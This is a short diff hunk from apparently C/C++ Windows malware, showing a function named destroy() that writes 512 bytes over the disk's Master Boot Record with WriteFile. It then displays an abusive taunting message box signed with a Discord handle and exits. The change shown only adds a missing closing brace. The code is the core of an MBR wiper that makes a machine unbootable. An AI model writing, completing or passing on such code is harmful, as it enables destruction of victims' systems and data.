@@ -11,7 +11,7 @@ void destroy(){
         NULL, OPEN_EXISTING, 0, NULL);
 	if(WriteFile(MBR, mbrData, 512, &write, NULL)==true) {
 		MessageBox(0, "Youve been fucked retard XD, feel free to direct all hate towards -- manjoos#0745", "LULZ", 0);
-
+	}
 	CloseHandle(MBR);
 	ExitProcess(0);
 }
